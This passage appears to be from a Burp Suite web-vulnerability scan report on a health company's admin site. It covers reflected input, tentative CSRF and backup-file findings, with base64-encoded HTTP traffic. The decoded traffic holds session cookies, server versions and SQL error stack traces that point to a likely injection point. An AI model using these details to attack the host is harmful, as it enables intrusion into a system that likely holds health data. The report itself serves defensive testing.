    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5MWtrZmduY2plYiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWVybHB2ZmpiMWlnajdvZ2w0aDFwNnBwY2JlOyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1pWXZySndZbFphZnZPS2h2OFZCNHFLRjFORXVEaTB4YXAyTUNlZW0rWTBWUzBTSFJ5dldtdGlKWVdYd2JqQk0ybnB4SEc5SkFyRFNpMnlpSy9yUmJiT0JTQnFOd0Zjc1JYeGgwY3c5MCtsT2F0Y2dyTzJIVmRRcUJGWWIvOyBBV1NBTEJDT1JTPWlZdnJKd1lsWmFmdk9LaHY4VkI0cUtGMU5FdURpMHhhcDJNQ2VlbStZMFZTMFNIUnl2V210aUpZV1h3YmpCTTJucHhIRzlKQXJEU2kyeWlLL3JSYmJPQlNCcU53RmNzUlh4aDBjdzkwK2xPYXRjZ3JPMkhWZFFxQkZZYi8NCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1ODo1NiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzIyDQpTZXQtQ29va2llOiBBV1NBTEI9TWlVaytiejQ0Rkp1T1NnaDhpMVJqRjVpSUovU0FoaDZRU0RYR2g2TkRZZmthN2FrRGxVTDFuN3hYbk9zN2ZNT0pPSWUzMUlSUTNtNDhvaVhndjVZTzdQU0p4cm9iWmppeTUxb1lhSER2U0s4bDR4SEVWRGNjdU82Tm53VjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU4OjU2IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPU1pVWsrYno0NEZKdU9TZ2g4aTFSakY1aUlKL1NBaGg2UVNEWEdoNk5EWWZrYTdha0RsVUwxbjd4WG5PczdmTU9KT0llMzFJUlEzbTQ4b2lYZ3Y1WU83UFNKeHJvYlpqaXk1MW9ZYUhEdlNLOGw0eEhFVkRjY3VPNk5ud1Y7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1ODo1NiBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJzM5OTFra2ZnbmNqZWInIGluICd3aGVyZSBjbGF1c2UnIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJzM5OTFra2ZnbmNqZWInKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJzM5OTFra2ZnbmNqZWInLCAnVXNlclByb2ZpbGUnLCBBcnJheSwgQXJyYXkpCiM0IHttYWlufQogIHRocm93biBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDwvYj4gb24gbGluZSA8Yj4yNDwvYj48YnIgLz4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9061904384220924928</serialNumber>
    <type>2098944</type>
    <name><![CDATA[Cross-site request forgery]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399]]></location>
    <severity>Medium</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>
<ul>
<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>
<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>
<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>
<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/csrf">Web Security Academy: Cross-site request forgery</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-">Using Burp to Test for Cross-Site Request Forgery</a></li><li><a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">The Deputies Are Still Confused</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li><li><a href="https://capec.mitre.org/data/definitions/62.html">CAPEC-62: Cross Site Request Forgery</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.<br><br>The original request contains parameters that look like they may be anti-CSRF tokens. However the request is successful if these parameters are removed.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9ZXJscHZmamIxaWdqN29nbDRoMXA2cHBjYmU7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPTk3OUU2aVhSejFTYlkreDZTZnRQY2prdGU1OVh3ZGlVYkwreFFJZWY3dDd1U0hOalBvZVFramV6OGhDeDR2VFM5QVFCVDN5eWFNdFlXU0xVY0ZoNk1zMDlCelhNbUxTdVdwMm9sRjNWWVF2Zk1ieTB0QmFkSTVNSXdValA7IEFXU0FMQkNPUlM9OTc5RTZpWFJ6MVNiWSt4NlNmdFBjamt0ZTU5WHdkaVViTCt4UUllZjd0N3VTSE5qUG9lUWtqZXo4aEN4NHZUUzlBUUJUM3l5YU10WVdTTFVjRmg2TXMwOUJ6WE1tTFN1V3Ayb2xGM1ZZUXZmTWJ5MHRCYWRJNU1Jd1VqUA0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDc1DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJmxhc3ROYW1lPWN5cGFydGEmcGhvbmU9MDAwMDAwMDAwMCZlbnRyaWVzUGVyUGFnZT01MA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MTozMCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMzANClNldC1Db29raWU6IEFXU0FMQj1zL29QaXY1UjBnNC9tczU2eGxRVlBVZXZvbE1PRUFQQjJ0c1prUmQ1M1R2dGFvdlRlaXZyUlFNc290SVFkSWJjaWhOVktVSHp0YnpQVFhieWIxL3RnbzVTNEZwNHpxV0xjWC9QQ3IvejJYaWdLMkZZT3cwbzNCMGdwckdqOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTE6MzAgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9cy9vUGl2NVIwZzQvbXM1NnhsUVZQVWV2b2xNT0VBUEIydHNaa1JkNTNUdnRhb3ZUZWl2clJRTXNvdElRZEliY2loTlZLVUh6dGJ6UFRYYnliMS90Z281UzRGcDR6cVdMY1gvUENyL3oyWGlnSzJGWU93MG8zQjBncHJHajsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUxOjMwIEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCg0KeyJjb2RlIjowLCJtZXNzYWdlIjoiU1VDQ0VTUyJ9]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9ZXJscHZmamIxaWdqN29nbDRoMXA2cHBjYmU7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPTFYak9nZDU5Z3dwZkZ5UHRSTlp0MGxrSEs5MHZhU1hHNVBjTzd4anQvTHZ3Q2o5ajQ2amxRYlVEMWh2Y1NKVnJrakFzUEc4MFJOdlVVMElSWFVqM3JTZDFYbEtMU0FBbit3dHozTWhVeXMxZFdyZXBNcFN1bFZRVVBSZkc7IEFXU0FMQkNPUlM9MVhqT2dkNTlnd3BmRnlQdFJOWnQwbGtISzkwdmFTWEc1UGNPN3hqdC9MdndDajlqNDZqbFFiVUQxaHZjU0pWcmtqQXNQRzgwUk52VVUwSVJYVWozclNkMVhsS0xTQUFuK3d0ejNNaFV5czFkV3JlcE1wU3VsVlFVUFJmRw0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9VQk1XeEFUaWxHelFxZmVOVmxDLmNvbS9Vc2VyUHJvZmlsZS8zOTkNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDU4DQoNClNhdmU9U2F2ZSZmaXJzdE5hbWU9WVlZJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OTowOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMzANClNldC1Db29raWU6IEFXU0FMQj1HMnhxelA3eG9EdFEzZlRxdTg0SktpTU1vaDFiMmJDMUYzM2lkS0EveXFhVmVHL3l1WDlaNDA2K2FiNXk1TVB5MFp4Mjg3VkNsMGR6dnRJRlpXdS9QL1FOSnN6dk1zOGwxWDVOM2ZaaXNYVnZsL0poVlQyeWFUbStCNGIyOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTk6MDggR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9RzJ4cXpQN3hvRHRRM2ZUcXU4NEpLaU1Nb2gxYjJiQzFGMzNpZEtBL3lxYVZlRy95dVg5WjQwNithYjV5NU1QeTBaeDI4N1ZDbDBkenZ0SUZaV3UvUC9RTkpzenZNczhsMVg1TjNmWmlzWFZ2bC9KaFZUMnlhVG0rQjRiMjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjA4IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCg0KeyJjb2RlIjowLCJtZXNzYWdlIjoiU1VDQ0VTUyJ9]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8427136716135273472</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20(copy)]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwKGNvcHkpIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYOyBBV1NBTEJDT1JTPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVgNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToxOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODIwDQpTZXQtQ29va2llOiBBV1NBTEI9OUQxQUwwT0ZBbjZKSFVkOFBBOTlyL2s2R2RrbHJLVHEvT0taTitlVU1uaFdYSHdGTzdRQjB3MlVjaVhpOFhzSTd1TG5UNitIQm9tWnRILzUxei9wQ0pQV090cTlubVAvUU05SU94eU8rRTVSZTdRRy9PaWZzbDBvVFZtMDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjE4IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPTlEMUFMME9GQW42SkhVZDhQQTk5ci9rNkdka2xyS1RxL09LWk4rZVVNbmhXWEh3Rk83UUIwdzJVY2lYaThYc0k3dUxuVDYrSEJvbVp0SC81MXovcENKUFdPdHE5bm1QL1FNOUlPeHlPK0U1UmU3UUcvT2lmc2wwb1RWbTA7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToxOCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnKGNvcHkpJyBhdCBsaW5lIDEgaW4gL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA6MjQKU3RhY2sgdHJhY2U6CiMwIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwKDI0KTogbXlzcWxpLSZndDtxdWVyeSgnU0VMRUNUICogZnJvbSB1Li4uJykKIzEgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS9tb2RlbHMvVXNlci5waHAoMTk0KTogRGJVdGlsOjpnZXRTZWxlY3RSZXN1bHQoT2JqZWN0KG15c3FsaSksICdTRUxFQ1QgKiBmcm9tIHUuLi4nKQojMiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2NvbnRyb2xsZXIvVXNlclByb2ZpbGVDb250cm9sbGVyLnBocCg5Nik6IFVzZXI6OmdldCgnMzk5IChjb3B5KScpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnMzk5IChjb3B5KScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
